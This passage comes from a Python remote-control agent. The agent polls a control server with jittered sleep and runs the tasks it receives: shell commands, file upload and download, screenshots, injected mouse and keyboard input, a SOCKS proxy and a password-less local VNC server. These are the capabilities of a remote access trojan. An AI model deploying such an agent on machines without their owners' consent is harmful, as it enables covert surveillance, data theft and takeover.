    if not isinstance(raw_events, list) or not raw_events:
        # single-event shorthand
        if payload.get("type"):
            raw_events = [payload]
        else:
            return {"error": "no_events", "applied": 0}

    # Optional user plug-in (elevated helper / custom UAC path)
    evs = [e for e in raw_events[:48] if isinstance(e, dict)]
    if evs and _input_provider_send(evs):
        sw, sh = _screen_size()
        return {
            "applied": len(evs),
            "screen": {"width": sw, "height": sh},
            "backend": "input_provider",
            "input_provider": _input_provider_status(),
        }

    sw, sh = _screen_size()
    applied = 0
    errors: list[str] = []
    is_win = os.name == "nt"

    def resolve_xy(ev: dict[str, Any]) -> tuple[int, int] | None:
        if "fx" in ev or "fy" in ev:
            try:
                fx = float(ev.get("fx", 0.5))
                fy = float(ev.get("fy", 0.5))
            except (TypeError, ValueError):
                return None
            fx = max(0.0, min(1.0, fx))
            fy = max(0.0, min(1.0, fy))
            return int(fx * (sw - 1)), int(fy * (sh - 1))
        if "x" in ev or "y" in ev:
            try:
                return int(ev.get("x") or 0), int(ev.get("y") or 0)
            except (TypeError, ValueError):
                return None
        return None

    def win_input(ev: dict[str, Any]) -> None:
        import ctypes
        from ctypes import wintypes

        user32 = ctypes.windll.user32  # type: ignore[attr-defined]
        typ = str(ev.get("type") or "click").lower()
        xy = resolve_xy(ev)

        # Prefer SendInput (modern) over mouse_event/keybd_event; still subject
        # to UIPI — elevated targets need an elevated agent.
        class MOUSEINPUT(ctypes.Structure):
            _fields_ = [
                ("dx", wintypes.LONG),
                ("dy", wintypes.LONG),
                ("mouseData", wintypes.DWORD),
                ("dwFlags", wintypes.DWORD),
                ("time", wintypes.DWORD),
                ("dwExtraInfo", ctypes.POINTER(ctypes.c_ulong)),
            ]

        class KEYBDINPUT(ctypes.Structure):
            _fields_ = [
                ("wVk", wintypes.WORD),
                ("wScan", wintypes.WORD),
                ("dwFlags", wintypes.DWORD),
                ("time", wintypes.DWORD),
                ("dwExtraInfo", ctypes.POINTER(ctypes.c_ulong)),
            ]

        class HARDWAREINPUT(ctypes.Structure):
            _fields_ = [
                ("uMsg", wintypes.DWORD),
                ("wParamL", wintypes.WORD),
                ("wParamH", wintypes.WORD),
            ]

        class INPUT_UNION(ctypes.Union):
            _fields_ = [("mi", MOUSEINPUT), ("ki", KEYBDINPUT), ("hi", HARDWAREINPUT)]

        class INPUT(ctypes.Structure):
            _fields_ = [("type", wintypes.DWORD), ("ii", INPUT_UNION)]

        INPUT_MOUSE = 0
        INPUT_KEYBOARD = 1
        MOUSEEVENTF_MOVE = 0x0001
        MOUSEEVENTF_ABSOLUTE = 0x8000
        MOUSEEVENTF_LEFTDOWN = 0x0002
        MOUSEEVENTF_LEFTUP = 0x0004
        MOUSEEVENTF_RIGHTDOWN = 0x0008
        MOUSEEVENTF_RIGHTUP = 0x0010
        MOUSEEVENTF_MIDDLEDOWN = 0x0020
        MOUSEEVENTF_MIDDLEUP = 0x0040
        KEYEVENTF_KEYUP = 0x0002

        def send_mouse(flags: int, x: int | None = None, y: int | None = None) -> None:
            inp = INPUT()
            inp.type = INPUT_MOUSE
            if x is not None and y is not None:
                # Absolute coords: 0..65535 mapped to primary virtual screen
                sx = max(1, sw - 1)
                sy = max(1, sh - 1)
                ax = int(max(0, min(sx, x)) * 65535 / sx)
                ay = int(max(0, min(sy, y)) * 65535 / sy)
                inp.ii.mi = MOUSEINPUT(
                    ax, ay, 0, flags | MOUSEEVENTF_MOVE | MOUSEEVENTF_ABSOLUTE, 0, None
                )
            else:
                inp.ii.mi = MOUSEINPUT(0, 0, 0, flags, 0, None)
            user32.SendInput(1, ctypes.byref(inp), ctypes.sizeof(INPUT))

        def send_mouse_rel(dx: int, dy: int) -> None:
            """Relative move (Parsec-class) — no ABSOLUTE flag."""
            if dx == 0 and dy == 0:
                return
            inp = INPUT()
            inp.type = INPUT_MOUSE
            inp.ii.mi = MOUSEINPUT(int(dx), int(dy), 0, MOUSEEVENTF_MOVE, 0, None)
            user32.SendInput(1, ctypes.byref(inp), ctypes.sizeof(INPUT))

        def send_wheel(delta: int, *, horizontal: bool = False) -> None:
            # WHEEL_DELTA = 120; mouseData is signed DWORD
            MOUSEEVENTF_WHEEL = 0x0800
            MOUSEEVENTF_HWHEEL = 0x1000
            flag = MOUSEEVENTF_HWHEEL if horizontal else MOUSEEVENTF_WHEEL
            notches = max(-20, min(20, int(delta)))
            if notches == 0:
                return
            inp = INPUT()
            inp.type = INPUT_MOUSE
            d = notches * 120
            inp.ii.mi = MOUSEINPUT(0, 0, d & 0xFFFFFFFF, flag, 0, None)
            user32.SendInput(1, ctypes.byref(inp), ctypes.sizeof(INPUT))

        KEYEVENTF_EXTENDEDKEY = 0x0001
        KEYEVENTF_SCANCODE = 0x0008
        # Arrows / navigation / Win — need EXTENDEDKEY for games/DirectInput
        _EXT_VKS = frozenset(
            {
                0x21,
                0x22,
                0x23,
                0x24,
                0x25,
                0x26,
                0x27,
                0x28,
                0x2D,
                0x2E,
                0x5B,
                0x5C,
            }
        )

        def send_key(vk: int, up: bool = False) -> None:
            """Inject via scan code (games-friendly) + VK fallback.

            Roblox / Unity / many engines read scancodes; pure VK taps fail for
            held WASD. We send KEYEVENTF_SCANCODE with MapVirtualKey scan.
            """
            vk = int(vk) & 0xFF
            if vk == 0:
                return
            # MAPVK_VK_TO_VSC = 0
            try:
                scan = int(user32.MapVirtualKeyW(vk, 0)) & 0xFF
            except Exception:
                scan = 0
            flags = 0
            if up:
                flags |= KEYEVENTF_KEYUP
            if vk in _EXT_VKS:
                flags |= KEYEVENTF_EXTENDEDKEY
            inp = INPUT()
            inp.type = INPUT_KEYBOARD
            if scan:
                flags |= KEYEVENTF_SCANCODE
                # wVk=0 when using scan codes (MS docs); some UIs still want VK
                inp.ii.ki = KEYBDINPUT(0, scan, flags, 0, None)
            else:
                inp.ii.ki = KEYBDINPUT(vk, 0, flags & ~KEYEVENTF_SCANCODE, 0, None)
            user32.SendInput(1, ctypes.byref(inp), ctypes.sizeof(INPUT))

        def resolve_vk(key: str) -> int | None:
            key = str(key or "").lower().replace("-", "_")
            vk_map = {
                "return": 0x0D,
                "enter": 0x0D,
                "escape": 0x1B,
                "esc": 0x1B,
                "tab": 0x09,
                "backspace": 0x08,
                "space": 0x20,
                "up": 0x26,
                "down": 0x28,
                "left": 0x25,
                "right": 0x27,
                "delete": 0x2E,
                "home": 0x24,
                "end": 0x23,
                "page_up": 0x21,
                "page_down": 0x22,
                "prior": 0x21,
                "next": 0x22,
                "insert": 0x2D,
                "shift": 0x10,
                "ctrl": 0x11,
                "control": 0x11,
                "alt": 0x12,
                "super": 0x5B,
                "win": 0x5B,
                "f1": 0x70,
                "f2": 0x71,
                "f3": 0x72,
                "f4": 0x73,
                "f5": 0x74,
                "f6": 0x75,
                "f7": 0x76,
                "f8": 0x77,
                "f9": 0x78,
                "f10": 0x79,
                "f11": 0x7A,
                "f12": 0x7B,
            }
            code = vk_map.get(key)
            if code is not None:
                return code
            if len(key) == 1:
                # Prefer literal letter/digit VKs (A=0x41 … Z=0x5A, 0=0x30)
                ch = key.upper()
                if "A" <= ch <= "Z":
                    return ord(ch)
                if "0" <= ch <= "9":
                    return ord(ch)
                code = user32.VkKeyScanW(ord(key)) & 0xFF
                return code if code != 0xFF else None
            return None

        def place_cursor() -> None:
            """Move host pointer under reported fx/fy before click/wheel."""
            if not xy:
                return
            x0, y0 = int(xy[0]), int(xy[1])
            user32.SetCursorPos(x0, y0)
            win_input._last_pos = (x0, y0)  # type: ignore[attr-defined]

        def mod_vks(mods: list[str]) -> list[int]:
            out: list[int] = []
            for m in mods:
                ml = str(m).lower()
                if ml in ("ctrl", "control", "ctl"):
                    out.append(0x11)  # VK_CONTROL
                elif ml in ("alt", "menu"):
                    out.append(0x12)  # VK_MENU
                elif ml in ("shift",):
                    out.append(0x10)  # VK_SHIFT
                elif ml in ("super", "win", "meta", "cmd"):
                    out.append(0x5B)  # VK_LWIN
            # de-dupe preserve order
            seen: set[int] = set()
            uniq: list[int] = []
            for v in out:
                if v not in seen:
                    seen.add(v)
                    uniq.append(v)
            return uniq

        if typ in ("rmove", "rel", "relative"):
            try:
                dx = int(ev.get("dx") or 0)
                dy = int(ev.get("dy") or 0)
            except (TypeError, ValueError):
                return
            # Clamp single packet to avoid runaway
            dx = max(-400, min(400, dx))
            dy = max(-400, min(400, dy))
            send_mouse_rel(dx, dy)
            return
        if typ in ("wheel", "wheel_h", "hwheel"):
            try:
                delta = int(ev.get("delta") or ev.get("dy") or ev.get("dx") or 0)
            except (TypeError, ValueError):
                delta = 0
            place_cursor()  # scroll the window under the pointer
            if delta:
                send_wheel(
                    1 if delta > 0 else -1,
                    horizontal=typ in ("wheel_h", "hwheel"),
                )
            return
        if typ == "move" and xy:
            # Pixel-quantize + SetCursorPos only (no SendInput ABSOLUTE).
            x0, y0 = int(xy[0]), int(xy[1])
            # Skip no-op moves (deadzone on host side too)
            last = getattr(win_input, "_last_pos", None)
            if last is not None and last[0] == x0 and last[1] == y0:
                return
            win_input._last_pos = (x0, y0)  # type: ignore[attr-defined]
            user32.SetCursorPos(x0, y0)
            return
        if typ in ("click", "dblclick", "down", "up"):
            place_cursor()
            btn = str(ev.get("button") or "left").lower()
            if btn == "right":
                down_flag, up_flag = MOUSEEVENTF_RIGHTDOWN, MOUSEEVENTF_RIGHTUP
            elif btn == "middle":
                down_flag, up_flag = MOUSEEVENTF_MIDDLEDOWN, MOUSEEVENTF_MIDDLEUP
            else:
                down_flag, up_flag = MOUSEEVENTF_LEFTDOWN, MOUSEEVENTF_LEFTUP
            if typ == "down":
                send_mouse(down_flag)
            elif typ == "up":
                send_mouse(up_flag)
            elif typ == "dblclick":
                for _ in range(2):
                    send_mouse(down_flag)
                    send_mouse(up_flag)
            else:
                send_mouse(down_flag)
                send_mouse(up_flag)
            return
        if typ == "type":
            text = str(ev.get("text") or "")
            for ch in text[:200]:
                vk = user32.VkKeyScanW(ord(ch))
                if vk == -1:
                    continue
                code = vk & 0xFF
                shift = (vk >> 8) & 1
                if shift:
                    send_key(0x10, up=False)
                send_key(code, up=False)
                send_key(code, up=True)
                if shift:
                    send_key(0x10, up=True)
            return
        if typ in ("key_down", "keydown", "key_up", "keyup"):
            # Game holds (WASD): down on press, up on release — no auto-tap
            code = resolve_vk(str(ev.get("key") or ""))
            if code:
                send_key(code, up=typ in ("key_up", "keyup"))
            return
        if typ == "key":
            code = resolve_vk(str(ev.get("key") or ""))
            raw_mods = ev.get("mods") or ev.get("modifiers") or []
            if isinstance(raw_mods, str):
                raw_mods = [m.strip() for m in raw_mods.split(",") if m.strip()]
            mods = [str(m) for m in raw_mods] if isinstance(raw_mods, list) else []
            # Boolean shortcuts from desk
            for flag, name in (
                ("ctrl", "ctrl"),
                ("control", "ctrl"),
                ("alt", "alt"),
                ("shift", "shift"),
                ("super", "super"),
            ):
                if ev.get(flag):
                    mods.append(name)
            m_vks = mod_vks(mods)
            if code:
                for vk in m_vks:
                    send_key(vk, up=False)
                send_key(code, up=False)
                send_key(code, up=True)
                for vk in reversed(m_vks):
                    send_key(vk, up=True)

    def linux_input(ev: dict[str, Any]) -> None:
        if not shutil.which("xdotool"):
            raise RuntimeError("xdotool_not_found")
        typ = str(ev.get("type") or "click").lower()
        xy = resolve_xy(ev)
        if typ in ("rmove", "rel", "relative"):
            try:
                dx = int(ev.get("dx") or 0)
                dy = int(ev.get("dy") or 0)
            except (TypeError, ValueError):
                return
            dx = max(-400, min(400, dx))
            dy = max(-400, min(400, dy))
            if dx or dy:
                subprocess.check_call(
                    ["xdotool", "mousemove_relative", "--", str(dx), str(dy)],
                    timeout=2,
                )
            return
        if typ in ("wheel", "wheel_h", "hwheel"):
            try:
                delta = int(ev.get("delta") or ev.get("dy") or ev.get("dx") or 0)
            except (TypeError, ValueError):
                delta = 0
            if xy:
                subprocess.check_call(
                    ["xdotool", "mousemove", str(xy[0]), str(xy[1])],
                    timeout=2,
                )
            if delta:
                if typ in ("wheel_h", "hwheel"):
                    btn = "7" if delta > 0 else "6"  # right / left
                else:
                    btn = "4" if delta > 0 else "5"  # up / down
                subprocess.check_call(["xdotool", "click", btn], timeout=2)
            return
        if typ == "move" and xy:
            # No --sync: under load it can block the Keepstream INPUT reader
            # for seconds and freeze remote cursor.
            subprocess.check_call(
                ["xdotool", "mousemove", str(xy[0]), str(xy[1])],
                timeout=2,
            )
            return
        if typ in ("click", "dblclick", "down", "up"):
            btn = str(ev.get("button") or "left").lower()
            bmap = {"left": "1", "middle": "2", "right": "3"}
            b = bmap.get(btn, "1")
            if xy:
                subprocess.check_call(
                    ["xdotool", "mousemove", str(xy[0]), str(xy[1])],
                    timeout=2,
                )
            if typ == "down":
                subprocess.check_call(["xdotool", "mousedown", b], timeout=3)
            elif typ == "up":
                subprocess.check_call(["xdotool", "mouseup", b], timeout=3)
            elif typ == "dblclick":
                subprocess.check_call(
                    ["xdotool", "click", "--repeat", "2", b], timeout=3
                )
            else:
                subprocess.check_call(["xdotool", "click", b], timeout=3)
            return
        if typ == "type":
            text = str(ev.get("text") or "")[:200]
            if text:
                subprocess.check_call(
                    ["xdotool", "type", "--clearmodifiers", "--", text],
                    timeout=5,
                )
            return
        def _xdo_key_name(key: str) -> str:
            kmap = {
                "return": "Return",
                "enter": "Return",
                "escape": "Escape",
                "esc": "Escape",
                "backspace": "BackSpace",
                "space": "space",
                "tab": "Tab",
                "up": "Up",
                "down": "Down",
                "left": "Left",
                "right": "Right",
                "delete": "Delete",
                "home": "Home",
                "end": "End",
                "page_up": "Page_Up",
                "page_down": "Page_Down",
                "insert": "Insert",
                "shift": "Shift_L",
                "ctrl": "Control_L",
                "control": "Control_L",
                "alt": "Alt_L",
                "super": "Super_L",
                "win": "Super_L",
            }
            return kmap.get(key.lower(), key)

        if typ in ("key_down", "keydown", "key_up", "keyup"):
            key = str(ev.get("key") or "")
            if key:
                k = _xdo_key_name(key)
                cmd = "keyup" if typ in ("key_up", "keyup") else "keydown"
                subprocess.check_call(["xdotool", cmd, k], timeout=3)
            return
        if typ == "key":
            key = str(ev.get("key") or "")
            if key:
                k = _xdo_key_name(key)
                raw_mods = ev.get("mods") or ev.get("modifiers") or []
                if isinstance(raw_mods, str):
                    raw_mods = [m.strip() for m in raw_mods.split(",") if m.strip()]
                mods = [str(m).lower() for m in raw_mods] if isinstance(raw_mods, list) else []
                for flag, name in (
                    ("ctrl", "ctrl"),
                    ("control", "ctrl"),
                    ("alt", "alt"),
                    ("shift", "shift"),
                    ("super", "super"),
                ):
                    if ev.get(flag):
                        mods.append(name)
                prefix = []
                for m in mods:
                    if m in ("ctrl", "control", "ctl"):
                        prefix.append("ctrl")
                    elif m == "alt":
                        prefix.append("alt")
                    elif m == "shift":
                        prefix.append("shift")
                    elif m in ("super", "win", "meta", "cmd"):
                        prefix.append("super")
                chord = "+".join(prefix + [k]) if prefix else k
                if prefix:
                    subprocess.check_call(["xdotool", "key", chord], timeout=3)
                else:
                    subprocess.check_call(
                        ["xdotool", "key", "--clearmodifiers", k], timeout=3
                    )

    for raw in raw_events[:32]:
        if not isinstance(raw, dict):
            continue
        try:
            if is_win:
                win_input(raw)
            else:
                linux_input(raw)
            applied += 1
        except Exception as exc:
            errors.append(str(exc))

    out: dict[str, Any] = {
        "applied": applied,
        "screen": {"width": sw, "height": sh},
        "backend": "win32-sendinput"
        if is_win
        else ("xdotool" if shutil.which("xdotool") else "none"),
        "input_provider": _input_provider_status(),
    }
    if is_win:
        elev = _process_elevated()
        if elev is not None:
            out["elevated"] = elev
            if not elev and out.get("backend") != "input_provider":
                out["uipi_note"] = (
                    "Agent is not elevated — Windows UIPI blocks input into "
                    "Task Manager / admin apps. Plug a custom input_provider "
                    "or run agent elevated."
                )
    if errors:
        out["errors"] = errors[:5]
        if applied == 0:
            out["error"] = errors[0]
    return out


def _desktop_start(payload: dict[str, Any]) -> dict[str, Any]:
    """Start desktop session: capture (default) and/or loopback VNC if binary present."""
    import shutil

    mode = str(payload.get("mode") or "capture").strip().lower()
    if mode in ("stop", "off"):
        return _desktop_stop()

    # Always enable capture mode (embedded live view uses screenshot tasks)
    _DESKTOP_STATE["mode"] = "capture"
    out: dict[str, Any] = {
        "started": True,
        "mode": "capture",
        "viewer": "embedded_capture",
        "note": "Desk Live view polls screenshot tasks; no external client required.",
    }

    want_vnc = mode in ("vnc", "both", "full")
    if want_vnc or mode == "auto":
        # Try loopback VNC for external/future embedded RFB clients
        try:
            port = int(payload.get("port") or 0)
        except (TypeError, ValueError):
            port = 0
        if port <= 0:
            port = 5901
        display = str(payload.get("display") or os.environ.get("DISPLAY") or ":0")
        bin_ = (
            shutil.which("x11vnc")
            or shutil.which("x0vncserver")
            or shutil.which("vncserver")
        )
        if bin_ and "x11vnc" in bin_:
            # Stop previous
            _desktop_stop()
            _DESKTOP_STATE["mode"] = "both"
            argv = [
                bin_,
                "-display",
                display,
                "-rfbport",
                str(port),
                "-localhost",
                "-forever",
                "-shared",
                "-nopw",
                "-quiet",
            ]
            try:
                proc = subprocess.Popen(
                    argv,
                    stdout=subprocess.DEVNULL,
                    stderr=subprocess.DEVNULL,
                )
                time.sleep(0.4)
                if proc.poll() is not None:
                    out["vnc"] = {"started": False, "error": "x11vnc_exited"}
                else:
                    _DESKTOP_STATE["vnc_proc"] = proc
                    _DESKTOP_STATE["vnc_port"] = port
                    out["mode"] = "both"
                    out["vnc"] = {
                        "started": True,
                        "port": port,
                        "bind": "127.0.0.1",
                        "display": display,
                        "via": "socks_or_local",
                        "note": "Tunnel with socks_start then vncviewer 127.0.0.1:"
                        + str(port),
                    }
            except Exception as exc:
                out["vnc"] = {"started": False, "error": str(exc)}
        elif bin_:
            out["vnc"] = {
                "started": False,
                "error": f"unsupported_vnc_binary:{bin_}",
                "hint": "install x11vnc for loopback VNC",
            }
        else:
            out["vnc"] = {
                "started": False,
                "error": "no_vnc_binary",
                "hint": "embedded Live capture still works; install x11vnc for RFB",
            }

    # Warm a first frame
    try:
        shot = _capture_screenshot()
        out["preview"] = {
            "path": shot.get("path"),
            "size": shot.get("size"),
            "method": shot.get("method"),
            "inline": shot.get("inline"),
        }
        if shot.get("data"):
            out["preview"]["data"] = shot["data"]
            out["preview"]["format"] = shot.get("format")
            out["preview"]["width"] = shot.get("width")
            out["preview"]["height"] = shot.get("height")
            out["preview"]["encoding"] = "base64"
    except Exception as exc:
        out["preview_error"] = str(exc)
    return out


def execute_task(
    task: dict[str, Any], *, cfg: dict[str, Any] | None = None, cfg_path: Path | None = None
) -> tuple[str, dict[str, Any]]:
    """Return (status, result)."""
    import base64

    type_ = str(task.get("type") or "")
    payload = task.get("payload") if isinstance(task.get("payload"), dict) else {}

    if type_ == "ping":
        return "succeeded", {"ok": True, "pong": True}

    if type_ == "note":
        return "succeeded", {"acked": True, "text": str(payload.get("text") or "")}

    if type_ == "rekey":
        new_token = str(payload.get("new_token") or "").strip()
        if not new_token:
            return "failed", {"error": "no_new_token"}
        if cfg is not None and cfg_path is not None:
            cfg["agent_token"] = new_token
            _save_config(cfg_path, cfg)
        return "succeeded", {"rekeyed": True}

    if type_ == "download":
        path = str(payload.get("path") or "").strip()
        if not path:
            return "failed", {"error": "empty_path"}
        try:
            offset = max(0, int(payload.get("offset") or 0))
        except (TypeError, ValueError):
            offset = 0
        try:
            length = int(payload.get("length") or FILE_CHUNK)
        except (TypeError, ValueError):
            length = FILE_CHUNK
        length = max(1, min(length, FILE_CHUNK))
        p = Path(path)
        try:
            if not p.is_file():
                return "failed", {"error": "not_a_file", "path": path}
            total = p.stat().st_size
            if total > FILE_CAP:
                return "failed", {
                    "error": "too_large",
                    "size": total,
                    "cap": FILE_CAP,
                }
            with p.open("rb") as fh:
                fh.seek(offset)
                data = fh.read(length)
            return "succeeded", {
                "path": path,
                "offset": offset,
                "length": len(data),
                "total_size": total,
                "has_more": offset + len(data) < total,
                "encoding": "base64",
                "data": base64.b64encode(data).decode("ascii"),
                # back-compat single-shot keys
                "size": len(data),
            }
        except OSError as exc:
            return "failed", {"error": str(exc), "path": path}

    if type_ == "upload":
        path = str(payload.get("path") or "").strip()
        b64 = str(payload.get("data") or payload.get("content") or "")
        if not path:
            return "failed", {"error": "empty_path"}
        mode = str(payload.get("mode") or "write").strip().lower()
        try:
            offset = int(payload.get("offset") or 0)
        except (TypeError, ValueError):
            offset = 0
        try:
            raw = base64.b64decode(b64, validate=False)
        except Exception as exc:
            return "failed", {"error": f"bad_base64: {exc}"}
        if len(raw) > FILE_CHUNK:
            return "failed", {
                "error": "chunk_too_large",
                "size": len(raw),
                "cap": FILE_CHUNK,
            }
        try:
            p = Path(path)
            p.parent.mkdir(parents=True, exist_ok=True)
            if mode == "append" or offset > 0:
                with p.open("r+b" if p.is_file() else "wb") as fh:
                    if offset > 0:
                        fh.seek(offset)
                    else:
                        fh.seek(0, 2)
                    fh.write(raw)
                    size = fh.tell()
            else:
                p.write_bytes(raw)
                size = len(raw)
            if size > FILE_CAP:
                return "failed", {"error": "too_large_after_write", "size": size}
            return "succeeded", {
                "path": path,
                "size": size,
                "chunk": len(raw),
                "offset": offset,
                "mode": mode,
                "written": True,
            }
        except OSError as exc:
            return "failed", {"error": str(exc), "path": path}

    if type_ == "socks_start":
        try:
            port = int(payload.get("port") or 0)
        except (TypeError, ValueError):
            port = 0
        try:
            return "succeeded", _socks_start(port)
        except Exception as exc:
            return "failed", {"error": str(exc)}

    if type_ == "socks_stop":
        try:
            return "succeeded", _socks_stop()
        except Exception as exc:
            return "failed", {"error": str(exc)}

    if type_ == "fs_list":
        path = str(payload.get("path") or payload.get("cwd") or "").strip()
        show_hidden = bool(payload.get("show_hidden") or payload.get("all"))
        result = _fs_list(path, show_hidden=show_hidden)
        if result.get("error"):
            return "failed", result
        return "succeeded", result

    if type_ == "fs_index_start":
        try:
            return "succeeded", _fs_index_start(payload if isinstance(payload, dict) else {})
        except Exception as exc:
            return "failed", {"error": str(exc)}

    if type_ == "fs_index_status":
        return "succeeded", _fs_index_status_payload()

    if type_ == "fs_index_stop":
        return "succeeded", _fs_index_stop()

    if type_ == "fs_search":
        result = _fs_search(payload if isinstance(payload, dict) else {})
        if result.get("error") == "empty_query":
            return "failed", result
        if result.get("error") == "no_index":
            return "failed", result
        return "succeeded", result

    if type_ == "screenshot":
        try:
            max_side = int(payload.get("max_side") or SHOT_MAX_SIDE)
        except (TypeError, ValueError):
            max_side = SHOT_MAX_SIDE
        max_side = max(320, min(max_side, SHOT_SIDE_HARD_CAP))
        prefer_inline = payload.get("inline", True)
        if isinstance(prefer_inline, str):
            prefer_inline = prefer_inline.lower() not in ("0", "false", "no")
        live = payload.get("live", False)
        if isinstance(live, str):
            live = live.lower() not in ("0", "false", "no")
        q_raw = payload.get("quality")
        quality: int | None
        try:
            quality = int(q_raw) if q_raw is not None and q_raw != "" else None
        except (TypeError, ValueError):
            quality = None
        include_cursor = payload.get("include_cursor", True)
        if isinstance(include_cursor, str):
            include_cursor = include_cursor.lower() not in ("0", "false", "no")
        try:
            result = _capture_screenshot(
                max_side=max_side,
                prefer_inline=bool(prefer_inline),
                live=bool(live),
                quality=quality,
                include_cursor=bool(include_cursor),
            )
            result["live"] = bool(live)
            result["max_side"] = max_side
            return "succeeded", result
        except Exception as exc:
            return "failed", {"error": str(exc)}

    if type_ == "desktop_start":
        try:
            return "succeeded", _desktop_start(payload)
        except Exception as exc:
            return "failed", {"error": str(exc)}

    if type_ == "desktop_stop":
        try:
            return "succeeded", _desktop_stop()
        except Exception as exc:
            return "failed", {"error": str(exc)}

    if type_ == "session_start":
        try:
            pl = dict(payload) if isinstance(payload, dict) else {}
            if cfg and cfg.get("agent_id"):
                pl.setdefault("agent_id", str(cfg.get("agent_id")))
            return "succeeded", _session_start(pl)
        except Exception as exc:
            return "failed", {"error": str(exc)}

    if type_ == "session_stop":
        try:
            return "succeeded", _session_stop(
                payload if isinstance(payload, dict) else {}
            )
        except Exception as exc:
            return "failed", {"error": str(exc)}

    if type_ == "desktop_input":
        try:
            result = _desktop_input(payload if isinstance(payload, dict) else {})
            if result.get("error") and int(result.get("applied") or 0) == 0:
                return "failed", result
            return "succeeded", result
        except Exception as exc:
            return "failed", {"error": str(exc)}

    if type_ == "shell":
        cmd = str(payload.get("cmd") or "").strip()
        if not cmd:
            return "failed", {"error": "empty_cmd"}
        timeout = float(payload.get("timeout_sec") or 60)
        timeout = max(1.0, min(timeout, 600.0))
        shell_req = str(payload.get("shell") or "auto")
        try:
            argv, resolved = _resolve_shell_argv(shell_req, cmd)
        except ValueError as exc:
            return "failed", {"error": str(exc), "exit_code": -1}
        try:
            proc = subprocess.run(
                argv,
                capture_output=True,
                text=True,
                timeout=timeout,
                check=False,
            )
            stdout, t1 = _cap(proc.stdout or "")
            stderr, t2 = _cap(proc.stderr or "")
            return "succeeded", {
                "stdout": stdout,
                "stderr": stderr,
                "exit_code": int(proc.returncode),
                "truncated": t1 or t2,
                "shell": resolved,
                "argv0": argv[0],
            }
        except FileNotFoundError:
            return "failed", {
                "error": f"shell_not_found:{resolved}",
                "shell": resolved,
                "exit_code": -1,
            }
        except subprocess.TimeoutExpired as exc:
            out = (exc.stdout or "") if isinstance(exc.stdout, str) else ""
            err = (exc.stderr or "") if isinstance(exc.stderr, str) else ""
            stdout, _ = _cap(out)
            stderr, _ = _cap(err)
            return "failed", {
                "error": "timeout",
                "stdout": stdout,
                "stderr": stderr,
                "exit_code": -1,
                "shell": resolved,
            }
        except Exception as exc:
            return "failed", {"error": str(exc), "exit_code": -1, "shell": resolved}

    return "failed", {"error": "unknown_type", "type": type_}


def sleep_delay(sleep: float, jitter: float) -> float:
    j = max(0.0, min(float(jitter), 1.0))
    factor = 1.0 + random.uniform(-j, j)
    return max(MIN_SLEEP, float(sleep) * factor)


def _try_enroll(
    client: AgentClient, cfg: dict[str, Any], cfg_path: Path, facts: dict[str, Any]
) -> tuple[str, str]:
    secret = str(cfg.get("enroll_secret") or os.environ.get("ENROLL_SECRET") or "").strip()
    if not secret:
        raise RuntimeError("need agent_token or enroll_secret")
    print("[agent] enrolling…", flush=True)
    # package_id from export package (plane prefers secret-bound id)
    if cfg.get("package_id") and "package_id" not in facts:
        facts = {**facts, "package_id": str(cfg.get("package_id") or "")}
    out = client.enroll(secret, facts)
    agent_id = str(out.get("agent_id") or "")
    token = str(out.get("agent_token") or "")
    if not agent_id or not token:
        raise RuntimeError("enroll response missing agent_id/token")
    cfg["agent_id"] = agent_id
    cfg["agent_token"] = token
    if out.get("package_id"):
        cfg["package_id"] = str(out.get("package_id"))
    cfg["sleep"] = float(out.get("sleep") or cfg.get("sleep") or 5)
    cfg["jitter"] = float(out.get("jitter") or cfg.get("jitter") or 0.2)
    if cfg.get("clear_enroll_secret", True):
        cfg.pop("enroll_secret", None)
    _save_config(cfg_path, cfg)
    client.token = token
    pkg = str(cfg.get("package_id") or "")
    extra = f" package={pkg}" if pkg else ""
    print(f"[agent] enrolled id={agent_id}{extra}", flush=True)
    return agent_id, token


def run_cycle(cfg: dict[str, Any], cfg_path: Path) -> dict[str, Any]:
    urls = _plane_urls(cfg)
    if not urls:
        raise RuntimeError("agent.json: base_url / plane_url / base_urls required")

    _RUNTIME["cfg"] = cfg
    _RUNTIME["cfg_path"] = str(cfg_path)

    # Canary first — fires even when enroll later fails (stolen zip signal)
    try:
        _fire_package_canary(cfg, cfg_path)
    except Exception:
        pass

    token = str(cfg.get("agent_token") or "").strip()
    agent_id = str(cfg.get("agent_id") or "").strip()
    facts = _host_facts(cfg)
    # Advertise whether a plug-in is configured (not whether process elevated)
    try:
        ip = _normalize_input_provider(cfg.get("input_provider"))
        facts["input_provider_configured"] = bool(ip)
        if ip:
            facts["input_provider_kind"] = str(ip.get("kind") or "")
    except Exception:
        pass
    spool = ResultSpool(_spool_path(cfg_path))

    client: AgentClient | None = None
    resp: dict[str, Any] | None = None
    last_err: Exception | None = None

    for base in urls:
        try:
            c = AgentClient(base, token or None)
            if _AGENT_VERBOSE:
                print(f"[agent] try plane {base}", flush=True)
            if not token or not agent_id:
                agent_id, token = _try_enroll(c, cfg, cfg_path, facts)
            # Flush any spooled results before check-in so desk sees them ASAP
            spool.drain(c)
            if _AGENT_VERBOSE:
                print(f"[agent] check-in as {agent_id}…", flush=True)
            resp = c.checkin(facts)
            client = c
            _RUNTIME["active_url"] = base
            # Remember last good URL as primary for next cycle
            cfg["base_url"] = base
            break
        except Exception as exc:
            last_err = exc
            print(f"[agent] plane {base} failed: {exc}", flush=True)
            continue

    if client is None or resp is None:
        raise RuntimeError(
            f"all plane URLs failed ({len(urls)}): {last_err}"
        )

    sleep = float(resp.get("sleep") or cfg.get("sleep") or 5)
    jitter = float(resp.get("jitter") or cfg.get("jitter") or 0.2)
    cfg["sleep"] = sleep
    cfg["jitter"] = jitter
    # Avoid rewriting agent.json every ~3s (disk + mtime thrash on long loops)
    prev_sleep = cfg.get("_last_written_sleep")
    prev_jitter = cfg.get("_last_written_jitter")
    if prev_sleep != sleep or prev_jitter != jitter or not cfg.get("agent_token"):
        cfg["_last_written_sleep"] = sleep
        cfg["_last_written_jitter"] = jitter
        _save_config(cfg_path, cfg)

    tasks = resp.get("tasks") or []
    if _AGENT_VERBOSE or tasks:
        print(
            f"[agent] {len(tasks)} task(s) via {_RUNTIME.get('active_url')}",
            flush=True,
        )

    def _task_prio(t: dict[str, Any]) -> int:
        # Lower = first. Input/screenshot before bulk FS so Live feels alive.
        typ = str(t.get("type") or "")
        if typ == "desktop_input":
            return 0
        if typ == "screenshot":
            return 1
        if typ == "rekey":
            return 9
        return 5

    # At most one screenshot per cycle (plane should already dedupe; belt+suspenders)
    ordered = sorted(tasks, key=_task_prio)
    seen_shot = False
    filtered: list[dict[str, Any]] = []
    for t in ordered:
